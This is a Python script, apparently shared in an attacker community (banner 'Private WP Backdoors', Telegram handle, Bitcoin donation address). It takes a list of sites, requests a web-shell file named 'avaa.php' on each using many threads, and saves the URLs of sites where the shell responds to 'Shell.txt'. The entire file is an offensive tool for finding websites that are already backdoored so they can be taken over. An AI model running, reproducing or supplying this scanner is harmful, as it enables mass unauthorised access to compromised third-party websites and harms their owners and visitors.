import os
import requests
from multiprocessing.dummy import Pool
from colorama import Fore, init
import time
from random import choice
import ctypes
import sys

init(autoreset=True)

b = 0
g = 0

banner = """ 

 ██████╗  █████╗ ██████╗  ██████╗   █████╗  █████╗ ███╗   ███╗███╗   ███╗██╗   ██╗███╗  ██╗██╗████████╗██╗   ██╗
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗████╗ ████║████╗ ████║██║   ██║████╗ ██║██║╚══██╔══╝╚██╗ ██╔╝
 ██████╦╝███████║██║  ██║╚█████╗   ██║  ╚═╝██║  ██║██╔████╔██║██╔████╔██║██║   ██║██╔██╗██║██║   ██║    ╚████╔╝ 
 ██╔══██╗██╔══██║██║  ██║ ╚═══██╗  ██║  ██╗██║  ██║██║╚██╔╝██║██║╚██╔╝██║██║   ██║██║╚████║██║   ██║     ╚██╔╝  
 ██████╦╝██║  ██║██████╔╝██████╔╝  ╚█████╔╝╚█████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚███║██║   ██║      ██║   
 ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝    ╚════╝  ╚════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚══╝╚═╝   ╚═╝      ╚═╝   
                         
           Private WP Backdoors 
           Code BY : @h0rn3t_sp1d3r
           Telegram : @bads_community
           Donate(BTC): 17nRr6QzzCAXrkZxsytnMqvgN3aEGixJef\n"""

def URLdomain(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site

def bads(site):
    global b, g
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        site = URLdomain(site)
        path =('avaa.php')
        url = site + path
        req = requests.get(url, headers=headers, verify=True, timeout=15)
        if '[ Avaa Bypassed ]' in req.text or  '-rw-r--r--' in req.text :
            print(Fore.GREEN+" Vuln : " +site)
            open("Shell.txt", "a").write(url + "\n")
            g = g + 1
        else:
            print(Fore.RED+" Not Vuln : " +site)
            b = b + 1
    except:
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('AVA | Found-{} | Not Vuln-{}'.format(g, b))
    else:
        sys.stdout.write('\x1b]2; AVA | Found-{} | Not Vuln-{}\x07'.format(g, b))


def run():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    try:
        print(Fore.CYAN+banner)
        filename = input(" Enter List => ")
        TT = int(input(" Threads => "))
        with open(filename, mode='r') as file:
            sites = [line.strip() for line in file.readlines()]
        print("\n")
    except FileNotFoundError:
        print("[!] File Not Found ")
        exit()
        
    with Pool(TT) as p:
        p.map(bads, sites)

if __name__ == "__main__":
    run()
    print("[!] Complete... "+input())
    
